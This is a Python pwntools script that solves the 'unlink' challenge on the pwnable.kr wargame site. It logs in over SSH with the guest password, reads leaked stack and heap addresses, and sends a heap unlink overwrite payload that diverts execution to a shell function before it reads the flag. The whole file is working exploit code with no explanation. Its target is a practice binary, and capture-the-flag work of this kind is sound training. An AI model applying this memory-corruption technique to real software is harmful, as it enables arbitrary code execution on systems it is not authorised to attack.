from pwn import *

shell = ssh('unlink', 'pwnable.kr', 2222, password='guest')
sh = shell.process('./unlink')

_ = sh.recvuntil(" leak: ")
A_stack_addr = int(sh.recvline().strip(), 16)

_ = sh.recvuntil(" leak: ")
A_heap_addr = int(sh.recvline().strip(), 16)

_ = sh.recvuntil("get shell!\n")

shell_addr = 0x080484eb

#payload = "A" * 8
payload = p32(shell_addr)
payload += "B" * 12
payload += p32(A_heap_addr + 0x08 + 0x04)
payload += p32(A_stack_addr + 0x10)

sh.sendline(payload)

sh.sendline("cat ./flag")
print(sh.recvline())
